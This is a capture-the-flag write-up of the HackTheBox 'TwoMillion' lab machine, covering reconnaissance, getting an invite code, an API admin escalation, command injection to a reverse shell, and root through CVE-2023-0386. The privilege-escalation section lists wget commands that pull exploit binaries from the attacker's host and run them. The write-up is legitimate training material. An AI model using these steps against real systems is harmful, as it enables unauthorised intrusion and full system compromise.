---
title: TwoMillion
published: true
layout: post
---

<br />

---------------
TwoMillion is an Easy difficulty Linux box that was released to celebrate reaching 2 million users on HackTheBox. The box features an old version of the HackTheBox platform that includes the old hackable invite code. After hacking the invite code an account can be created on the platform. The account can be used to enumerate various API endpoints, one of which can be used to elevate the user to an Administrator. With administrative access the user can perform a command injection in the admin VPN generation endpoint thus gaining a system shell. An .env file is found to contain database credentials and owed to password re-use the attackers can login as user admin on the box. The system kernel is found to be outdated and CVE-2023-0386 can be used to gain a root shell.
<br />

<iframe style="aspect-ratio: 16 / 9; width: 65%; display: block; margin: auto;" src="https://www.youtube.com/embed/9IHqrm0D0XY?si=GDmwfyO8pUFXgMW0" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>

<br />

---------------------------------------------------
<br />

## Walkthrough

### Reconnaissance

We will start by **scanning protocolos** in the target machine, this can be divided in 2 phases:
1. Scan for **open ports**.
2. Scan for **services** in these open ports.

<br />

Let's start by scanning for **open ports**:

```bash
sudo nmap -sT 10.10.11.221 -p- -T4 --min-rate 5000 -oN all_tcp_ports.txt --open -n -Pn -vv
sudo nmap -sU 10.10.11.221 -p- -T4 --min-rate 5000 -oN all_udp_ports.txt --open -n -Pn -vv
```
<br />

There are **2 open ports**:
+ **22/tcp**
+ **80/tcp**

<br />

Let's check which **services** are running in these ports:

```bash
sudo nmap -sU 10.10.11.221 -p 22,80 -T4 --min-rate 5000 -oX open_tcp_ports.xml -oN open_tcp_ports.txt --version-all -n -Pn -A
```
<br />

These services are:
+ **22/tcp OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)**
+ **80/tcp nginx**

<br />

There is an **hostname** in the scan results:<br />
![](/assets/TwoMillion/1.png)
<br />
<br />

Let's add the **hostname** to our **/etc/hosts** file:

```bash
echo "10.10.11.221 2million.htb" | sudo tee --append /etc/hosts
```
<br />

------
<br />
### Foothold

Inspecting the website I found a site that brings back old memories:<br />
![](/assets/TwoMillion/2.png)
<br />
<br />

To get an **invitation code** and log in we need to inspect the website source code and find this JS file loaded:

```javascript
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('1 i(4){h 8={"4":4};$.9({a:"7",5:"6",g:8,b:\'/d/e/n\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}1 j(){$.9({a:"7",5:"6",b:\'/d/e/k/l/m\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}',24,24,'response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api/v1|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify'.split('|'),0,{}))
```
<br />

Let's upload this code to ChatGPT to **deobfuscate** it:

```javascript
function verifyInviteCode(code) {
    var formData = { "code": code };
    $.ajax({
        type: "POST",
        dataType: "json",
        data: formData,
        url: '/api/v1/invite/verify',
        success: function(response) {
            console.log(response);
        },
        error: function(response) {
            console.log(response);
        }
    });
}

function makeInviteCode() {
    $.ajax({
        type: "POST",
        dataType: "json",
        url: '/api/v1/invite/how/to/generate',
        success: function(response) {
            console.log(response);
        },
        error: function(response) {
            console.log(response);
        }
    });
}
```
<br />

It seems that there are two functions:
- verifyInviteCode(): Sends a POST request to verify an invite code by passing it as a parameter to /api/v1/invite/verify.
- makeInviteCode(): Sends a POST request to the endpoint /api/v1/invite/how/to/generate, likely to get instructions or generate a new invite code.

We can execute the **makeInviteCode()** in our browser's developer tools:<br />
![](/assets/TwoMillion/3.png)
<br />
<br />

It seems that the data is encrypted using ROT13 encryption, which unencrypted is **"In order to generate the invite code, make a POST request to /api/v1/invite/generate"**, so let's follow the instruction:

```bash
curl -X POST http://2million.htb/api/v1/invite/generate
```

![](/assets/TwoMillion/4.png)
<br />
<br />

The code is encoded in base64, let's decode it and use it:

```bash
echo "MTJKQTktSlROT1YtSUoxVkotTVM2Uzg=" | base64 -d
```

![](/assets/TwoMillion/5.png)
<br />
<br />

Great!!! We got a registration panel, let's create an account and log in:<br />
![](/assets/TwoMillion/6.png)
<br />
<br />

However, once I logged in I didn't found anything, but enumerating the website I found sensitive API information:<br />
![](/assets/TwoMillion/7.png)
<br />
<br />

We can leverage **BurpSuite** to became admin:<br />
![](/assets/TwoMillion/8.png)
<br />
<br />

However this didn't return anything relevant, so I inspected the other **API endpoints** and one is vulnerable to **command injection**, so let's get a reverse shell:<br />
![](/assets/TwoMillion/9.png)
<br />
<br />

We got a foothold!! Let's escalate privileges in the next section:<br />
![](/assets/TwoMillion/10.png)
<br />
<br />

------
<br />
### Privilege Escalation

Performing enumeration on the machine, I found an interesting email:

```bash
cat /var/mail/admin
```

![](/assets/TwoMillion/11.png)
<br />
<br />

I used this [GitHub repository](https://github.com/sxlmnwb/CVE-2023-0386) to exploit this vulnerability, however we need some libraries for it to work, and then run some commands:

```bash
sudo apt install libfuse-dev
make all
sudo python3 -m http.server 80
```
<br />

Back to our **reverse shell instance**, we will run this commands:

```bash
mkdir /tmp/fuse
cd /tmp/fuse
wget http://10.10.16.12/fuse
wget http://10.10.16.12/exp
wget http://10.10.16.12/gc
mkdir ovlcap
touch ovlcap/.gitkeep
./fuse ./ovlcap/lower ./gc
```
<br />

Let's finally open another reverse shell instance and run:

```bash
./exp
script /dev/null -c /bin/bash
```

![](/assets/TwoMillion/12.png)
<br />
<br />
